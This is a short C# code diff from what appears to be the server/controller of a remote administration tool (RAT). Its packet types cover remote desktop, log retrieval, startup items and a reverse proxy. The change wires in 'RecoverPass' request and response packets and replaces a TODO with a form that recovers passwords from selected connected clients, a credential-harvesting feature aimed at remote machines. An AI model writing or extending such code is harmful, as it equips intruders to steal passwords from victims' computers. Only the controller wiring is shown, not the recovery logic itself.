@@ -135,9 +135,7 @@ namespace xServer.Forms
                 typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                 typeof (Core.Packets.ServerPackets.GetLogs),
-                typeof (Core.Packets.ServerPackets.PasswordRequest),
                 typeof (Core.Packets.ClientPackets.Initialize),
-                typeof (Core.Packets.ClientPackets.PasswordResponse),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
                 typeof (Core.Packets.ClientPackets.DesktopResponse),
@@ -153,7 +151,9 @@ namespace xServer.Forms
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
-                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect),
+                typeof (Core.Packets.ClientPackets.RecoverPassResponse),
+                typeof (Core.Packets.ServerPackets.RecoverPassRequest),
             });
 
             ListenServer.ServerState += ServerState;
@@ -251,9 +251,9 @@ namespace xServer.Forms
             {
                 CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.PasswordResponse))
+            else if (type == typeof(Core.Packets.ClientPackets.RecoverPassResponse))
             {
-                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.PasswordResponse)packet);
+                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.RecoverPassResponse)packet);
             }
             else if (type == typeof(Core.Packets.ClientPackets.UserStatus))
             {
@@ -623,7 +623,7 @@ namespace xServer.Forms
         {
             if (lstClients.SelectedItems.Count != 0)
             {
-                // TODO
+                new FrmPasswordRecovery(GetSelectedClients().ToList()).ShowDialog();
             }
         }
 
